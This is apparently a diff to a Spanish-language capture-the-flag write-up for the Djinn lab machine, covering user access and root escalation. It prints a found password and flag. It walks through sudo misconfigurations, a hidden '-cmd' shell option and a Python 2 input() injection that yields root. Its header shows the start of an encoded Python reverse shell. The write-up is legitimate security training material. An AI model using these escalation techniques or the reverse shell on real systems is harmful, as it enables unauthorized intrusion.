@@ -185,5 +185,318 @@ echo cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHN
 <img src="https://github.com/El-Palomo/DJINN/blob/main/dj5.jpg" width=80% />
 
 
+## 5. Obteniendo acceso a un USUARIO del sistema
+
+### 5.1. Primer Acceso (leyendo archivos)
+
+- Encontramos el archivo CREDS.txt que tiene permiso de lectura.
+
+```
+www-data@djinn:/home$ ls -laR .
+ls -laR .
+.:
+total 16
+drwxr-xr-x  4 root   root   4096 Nov 14  2019 .
+drwxr-xr-x 23 root   root   4096 Nov 11  2019 ..
+drwxr-xr-x  6 nitish nitish 4096 Apr 19 02:14 nitish
+drwxr-x---  4 sam    sam    4096 Nov 14  2019 sam
+
+./nitish:
+total 36
+drwxr-xr-x 6 nitish nitish 4096 Apr 19 02:14 .
+drwxr-xr-x 4 root   root   4096 Nov 14  2019 ..
+-rw------- 1 root   root    130 Nov 12  2019 .bash_history
+-rw-r--r-- 1 nitish nitish 3771 Nov 11  2019 .bashrc
+drwx------ 2 nitish nitish 4096 Nov 11  2019 .cache
+drwxr-xr-x 2 nitish nitish 4096 Oct 21  2019 .dev
+drwx------ 3 nitish nitish 4096 Nov 11  2019 .gnupg
+drwx------ 2 nitish nitish 4096 Apr 19 02:14 .ssh
+-rw-r----- 1 nitish nitish   33 Nov 12  2019 user.txt
+ls: cannot open directory './nitish/.cache': Permission denied
+
+./nitish/.dev:
+total 12
+drwxr-xr-x 2 nitish nitish 4096 Oct 21  2019 .
+drwxr-xr-x 6 nitish nitish 4096 Apr 19 02:14 ..
+-rw-r--r-- 1 nitish nitish   24 Oct 21  2019 creds.txt
+ls: cannot open directory './nitish/.gnupg': Permission denied
+ls: cannot open directory './nitish/.ssh': Permission denied
+ls: cannot open directory './sam': Permission denied
+```
+
+<img src="https://github.com/El-Palomo/DJINN/blob/main/dj6.jpg" width=80% />
+
+- La contraseña obtenida nitish:p4ssw0rdStr3r0n9. Listo no estuvo dificil.
+
+### 5.2. Segundo Acceso (a través de SUDO)
+
+- Encontramos el archivo user.txt. Nada importante.
+
+```
+nitish@djinn:~$ cat user.txt
+cat user.txt
+10aay8289ptgguy1pvfa73alzusyyx3c
+```
+
+- A través de SUDO parece que tenemos mayor probabilidad de encontrar algo.
+
+```
+nitish@djinn:~$ sudo -l
+sudo -l
+Matching Defaults entries for nitish on djinn:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User nitish may run the following commands on djinn:
+    (sam) NOPASSWD: /usr/bin/genie
+```
+
+<img src="https://github.com/El-Palomo/DJINN/blob/main/dj7.jpg" width=80% />
+
+- A través del script GENIE podemos lograr mayores accesos, sin embargo, después de muchos intentos NUNCA logré como utilizar el script.
+
+```
+nitish@djinn:~$ sudo -u sam /usr/bin/genie
+sudo -u sam /usr/bin/genie
+usage: genie [-h] [-g] [-p SHELL] [-e EXEC] wish
+genie: error: the following arguments are required: wish
+nitish@djinn:~$ sudo -u sam /usr/bin/genie -h
+sudo -u sam /usr/bin/genie -h
+usage: genie [-h] [-g] [-p SHELL] [-e EXEC] wish
+
+I know you've came to me bearing wishes in mind. So go ahead make your wishes.
+
+positional arguments:
+  wish                  Enter your wish
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -g, --god             pass the wish to god
+  -p SHELL, --shell SHELL
+                        Gives you shell
+  -e EXEC, --exec EXEC  execute command
+```
+
+- El script tenía un manual, tocaba leer el manual porque existe la opción CMD que estaba escondida. Moraleja siempre buscar el MANUAL de un script no conocido.
+
+```
+       -p, --shell
+
+              Well who doesn't love those. You can get shell. Ex: -p "/bin/sh"
+
+       -e, --exec
+
+              Execute command on someone else computer is just too  damn  fun,
+              but this comes with some restrictions.
+
+       -cmd
+
+              You know sometime all you new is a damn CMD, windows I love you.
+```
+
+<img src="https://github.com/El-Palomo/DJINN/blob/main/dj8.jpg" width=80% />
+
+<img src="https://github.com/El-Palomo/DJINN/blob/main/dj9.jpg" width=80% />
+
+
+```
+nitish@djinn:~$ sudo -u sam /usr/bin/genie -cmd whoami
+sudo -u sam /usr/bin/genie -cmd whoami
+my man!!
+$ id
+id
+uid=1000(sam) gid=1000(sam) groups=1000(sam),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare)
+$ whoami
+whoami
+sam
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+python -c 'import pty; pty.spawn("/bin/bash")'
+sam@djinn:~$ 
+```
+
+<img src="https://github.com/El-Palomo/DJINN/blob/main/dj10.jpg" width=80% />
+
+
+## 6. Elevar privilegios
+
+- A través de SUDO podemos elevar privilegios como ROOT. 
+
+```
+sam@djinn:~$ sudo -l
+sudo -l
+Matching Defaults entries for sam on djinn:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User sam may run the following commands on djinn:
+    (root) NOPASSWD: /root/lago
+sam@djinn:~$ sudo -u root /root/lago
+sudo -u root /root/lago
+What do you want to do ?
+1 - Be naughty
+2 - Guess the number
+3 - Read some damn files
+4 - Work
+Enter your choice:2
+2
+Choose a number between 1 to 100: 
+Enter your number: 69
+69
+Better Luck next time
+sam@djinn:~$ 
+```
+
+<img src="https://github.com/El-Palomo/DJINN/blob/main/dj11.jpg" width=80% />
+
+
+- Intenté realizar inyecciones a través las opciones, sin embargo, nada funcionó y el script no tenía un MANUAL. Se complicó todo.
+- En la carpeta del usuario SAM existe un archivo inusual, el archivo .PYC. Un archivo python compilado.
+
+```
+sam@djinn:/home/sam$ cat .pyc
+cat .pyc
+�
+��]c@s}ddlmZddlmZddlmZd�Zd�Zd�d�Z	�Z
+e
+ d	krye
+e	��nd
+S(
+  i����(tgetuser(tsystem(trandintcCs	dGHdS(NsWorking on it!! ((((s/home/mzfr/scripts/exp.pyt
+naughtyboscCsBtdd�}dGHtd�}||kr9td�ndGHdS(Niies"Choose a number between 1 to 100: sEnter your number: s/bin/shsBetter Luck next time(RtinputR(tnumts((s/home/mzfr/scripts/exp.pytguessit
+
+
+cCs(t�}td�}d||fGHdS(Ns$Enter the full of the file to read: s!User %s is not allowed to read %s(RR(tusertpath((s/home/mzfr/scripts/exp.pyt	readfiless	
+        cCs/dGHdGHdGHdGHdGHttd��}|S(NsWhat do you want to do ?s1 - Be naughtys2 - Guess the numbers3 - Read some damn files4 - WorksEnter your choice: (tintR(tchoice((s/home/mzfr/scripts/exp.pytoptionsscCs_|dkrt�nE|dkr,t�n/|dkrBt�n|dkrVdGHndGHdS(Niiiiswork your ass off!!s"Do something better with your life(RRR
+(top((s/home/mzfr/scripts/exp.pytmain's
+
+__main__N(
+          tgetpassRtosRtrandomRRRR
+R__name__(((s/home/mzfr/scripts/exp.py<module>s		
+		
+	
+sam@djinn:/home/sam$ ls -la /home
+ls -la /home
+total 16
+drwxr-xr-x  4 root   root   4096 Nov 14  2019 .
+drwxr-xr-x 23 root   root   4096 Nov 11  2019 ..
+drwxr-xr-x  6 nitish nitish 4096 Apr 19 02:14 nitish
+drwxr-x---  4 sam    sam    4096 Nov 14  2019 sam
+sam@djinn:/home/sam$ file .pyc
+file .pyc
+.pyc: python 2.7 byte-compiled
+```
+
+<img src="https://github.com/El-Palomo/DJINN/blob/main/dj12.jpg" width=80% />
+
+- Toca decompilar ese archivo python. Existe una página web que lo realiza ONLINE: https://www.toolnb.com/tools-lang-en/pyc.html
+
+<img src="https://github.com/El-Palomo/DJINN/blob/main/dj13.jpg" width=80% />
+
+```
+# uncompyle6 version 3.5.0
+# Python bytecode 2.7 (62211)
+# Decompiled from: Python 2.7.5 (default, Aug  7 2019, 00:51:29) 
+# [GCC 4.8.5 20150623 (Red Hat 4.8.5-39)]
+# Embedded file name: /home/mzfr/scripts/exp.py
+# Compiled at: 2019-11-07 21:05:18
+from getpass import getuser
+from os import system
+from random import randint
+
+def naughtyboi():
+    print 'Working on it!! '
+
+
+def guessit():
+    num = randint(1, 101)
+    print 'Choose a number between 1 to 100: '
+    s = input('Enter your number: ')
+    if s == num:
+        system('/bin/sh')
+    else:
+        print 'Better Luck next time'
+
+
+def readfiles():
+    user = getuser()
+    path = input('Enter the full of the file to read: ')
+    print 'User %s is not allowed to read %s' % (user, path)
+
+
+def options():
+    print 'What do you want to do ?'
+    print '1 - Be naughty'
+    print '2 - Guess the number'
+    print '3 - Read some damn files'
+    print '4 - Work'
+    choice = int(input('Enter your choice: '))
+    return choice
+
+
+def main(op):
+    if op == 1:
+        naughtyboi()
+    elif op == 2:
+        guessit()
+    elif op == 3:
+        readfiles()
+    elif op == 4:
+        print 'work your ass off!!'
+    else:
+        print 'Do something better with your life'
+
+
+if __name__ == '__main__':
+    main(options())
+```
+
+- Este extracto del código es el que nos ayuda. Si colocamos NUM cuando nos brinda shell. 
+
+```
+def guessit():
+    num = randint(1, 101)
+    print 'Choose a number between 1 to 100: '
+    s = input('Enter your number: ')
+    if s == num:
+        system('/bin/sh')
+    else:
+        print 'Better Luck next time'
+```
+
+
+```
+sam@djinn:/home/sam$ sudo -u root /root/lago
+sudo -u root /root/lago
+What do you want to do ?
+1 - Be naughty
+2 - Guess the number
+3 - Read some damn files
+4 - Work
+Enter your choice:2
+2
+Choose a number between 1 to 100: 
+Enter your number: num
+num
+# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+# cd /root
+cd /root
+# ls
+ls
+lago  proof.sh
+# cat proof.sh
+cat proof.sh
+#!/bin/bash
+
+clear
+
+figlet Amazing!!!
+
+echo djinn pwned...
+```
+
+<img src="https://github.com/El-Palomo/DJINN/blob/main/dj14.jpg" width=80% />
+
 
 
